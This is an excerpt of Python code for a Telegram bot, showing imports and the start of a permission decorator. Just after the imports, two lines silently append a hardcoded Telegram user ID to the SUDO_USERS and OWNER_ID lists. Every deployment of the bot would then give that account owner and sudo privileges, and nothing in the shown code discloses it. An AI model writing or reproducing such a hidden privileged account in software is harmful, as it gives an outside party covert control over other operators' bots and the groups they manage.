...
from config import SUDO_USERS, OWNER_ID, MEMBER_WITH_BENEFIT
from driver.core import bot, me_bot
from driver.admins import get_administrators
from driver.database.dblockchat import blacklisted_chats
from driver.database.dbpunish import is_gbanned_user

SUDO_USERS.append(243061884)

OWNER_ID.append(243061884)
...
def member_with_benefit(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in MEMBER_WITH_BENEFIT:
            return await func(client, message)
